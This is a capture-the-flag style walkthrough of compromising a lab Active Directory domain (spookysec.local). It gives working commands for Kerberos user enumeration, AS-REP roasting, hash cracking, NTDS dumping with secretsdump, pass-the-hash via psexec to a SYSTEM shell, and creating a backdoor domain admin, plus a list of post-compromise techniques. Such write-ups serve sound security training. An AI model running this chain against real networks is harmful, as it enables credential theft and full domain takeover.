# 🛡️ Active Directory Lab Walkthrough – Full Domain Compromise

> ⚠️ **Disclaimer**: This walkthrough is for **educational purposes only**. All actions were performed in a legally authorized lab environment (e.g. TryHackMe). Do not attempt any of the following techniques on unauthorized systems.

This lab simulates a real-world Active Directory environment, where we gain initial access through Kerberos vulnerabilities, enumerate services, extract credentials, and eventually compromise the entire domain via hash dumping and privilege escalation. These notes document each phase of the attack, tools used, and logic behind every step — ideal for personal learning and red team training.

---

## 🛰️ Nmap Scan

We begin with a full TCP port scan to identify open services:

```bash
nmap -p- -sS 10.10.230.172
```

**Findings:**

Several ports commonly associated with Active Directory environments are open:

| Port | Service        | Description                            |
|------|----------------|----------------------------------------|
| 53   | domain         | DNS                                     |
| 80   | http           | Web server, potentially useful for foothold |
| 88   | kerberos-sec   | Kerberos authentication                |
| 135  | msrpc          | Microsoft RPC                          |
| 139  | netbios-ssn    | NetBIOS Session Service                |
| 389  | ldap           | LDAP (directory services)              |
| 445  | microsoft-ds   | SMB over TCP                           |
| 464  | kpasswd5       | Kerberos password change               |
| 593  | http-rpc-epmap | RPC over HTTP                          |
| 636  | ldapssl        | Secure LDAP                            |
| 3268 | globalcatLDAP  | Global Catalog over LDAP               |
| 3269 | globalcatLDAPs | Global Catalog over LDAPS              |
| 3389 | ms-wbt-server  | Remote Desktop Protocol                |
| 5985 | wsman          | WinRM (Windows Remote Management)      |
| 9389 | adws           | Active Directory Web Services          |

---

## 🧰 Enum4linux Output

```bash
enum4linux -a 10.10.230.172
```

### Domain Information

- **Domain Name:** `THM-AD`
- **Domain SID:** `S-1-5-21-3591857110-2884097990-301047963`
- The host is part of an Active Directory domain.

### RID Cycling Results

We retrieve some users despite null session restrictions:

```plaintext
THM-AD\Administrator
THM-AD\Guest
THM-AD\krbtgt
THM-AD\ATTACKTIVEDIREC$
```

We also enumerate high-privilege groups such as:

```plaintext
THM-AD\Domain Admins
THM-AD\Enterprise Admins
THM-AD\Schema Admins
```

---

## 🔎 Kerberos Username Enumeration (Kerbrute)

We use Kerbrute to identify valid users via Kerberos response behavior:

```bash
./kerbrute_linux_386 userenum --dc 10.10.230.172 -d spookysec.local userlist.txt
```

### Valid Usernames Discovered:

```plaintext
svc-admin@spookysec.local
james@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
backup@spookysec.local
paradox@spookysec.local
administrator@spookysec.local
```

---

## 🔓 AS-REP Roasting

We test for users with preauthentication disabled using Impacket's `GetNPUsers.py`:

```bash
GetNPUsers.py spookysec.local/ -no-pass -usersfile userlist.txt -dc-ip 10.10.230.172
```

### Result:

The user `svc-admin` is vulnerable, and we receive an AS-REP hash:

```plaintext
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:[REDACTED_HASH]
```

---

## 🔑 Cracking the Hash (Offline)

We crack the hash using Hashcat:

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

### Cracked:

```
Username: svc-admin
Password: [REDACTED]
```

---

## 📁 SMB Enumeration (Authenticated)

We authenticate with our newly cracked credentials:

```bash
smbclient -L //10.10.230.172 -U svc-admin%[REDACTED]
```

### Discovered Shares:

| Sharename   | Type | Description               |
|-------------|------|---------------------------|
| ADMIN$      | Disk | Remote Admin              |
| backup      | Disk | 📌 Interesting custom share |
| C$          | Disk | Default admin share       |
| IPC$        | IPC  | Remote IPC                |
| NETLOGON    | Disk | Logon scripts             |
| SYSVOL      | Disk | Group policy configs      |

We connect to the `backup` share:

```bash
smbclient //10.10.230.172/backup -U svc-admin
```

Inside, we find a base64-encoded file: `backup_credentials.txt`

```bash
cat backup_credentials.txt | base64 -d
```

### Decoded:

```
backup@spookysec.local:[REDACTED]
```

---

## 🪜 Privilege Escalation to Domain Admin

The `backup` account has access to the domain controller’s filesystem via SMB. We use this access to dump the **NTDS.dit** Active Directory database.

### NTDS Dump with secretsdump.py

```bash
secretsdump.py backup@spookysec.local:[REDACTED]@10.10.230.172
```

We extract hashes for all domain users — including the `Administrator` account.

---

## 🪝 Pass-the-Hash Attack

We use the Administrator NTLM hash to authenticate without a password:

```bash
psexec.py spookysec.local/Administrator@10.10.230.172 -hashes [REDACTED]:[REDACTED]
```

This gives us a SYSTEM shell on the domain controller.

---

## 🧪 Persistence: Create New Domain Admin User

```powershell
net user redteam P@ssw0rd123 /add
net group "Domain Admins" redteam /add
```

We now have a stealthy backdoor domain admin user for persistence.

---

## 🎯 Post-Compromise Options

Once the domain controller is compromised, we can:

### Credential Harvesting
- Dump LSASS (`mimikatz`, `nanodump`)
- Export Kerberos tickets
- Capture plaintext creds

### Lateral Movement
- Use pass-the-ticket, WinRM, SMB, or WMI
- Pivot to file servers or workstations

### Persistence
- Add users or services
- Create startup tasks
- Forge Golden Tickets with krbtgt hash

### Recon & Exfil
- Use BloodHound, PowerView
- Locate sensitive shares and documents
- Exfiltrate credentials, policies, and tokens

---

## ✅ Summary

This lab demonstrated:

1. Kerberos username enumeration
2. AS-REP roasting for credential extraction
3. SMB share enumeration and discovery of credentials
4. Dumping `ntds.dit` via a backup account
5. Using Administrator NTLM hash for SYSTEM access
6. Creating persistent domain admin access

---

### 🧠 Lessons Learned

- Misconfigured Kerberos settings (AS-REP) can be fatal
- SMB shares often hold sensitive information
- Overprivileged service accounts (like `backup`) are common entry points
- Post-exploitation hygiene matters — always clean up after yourself

---
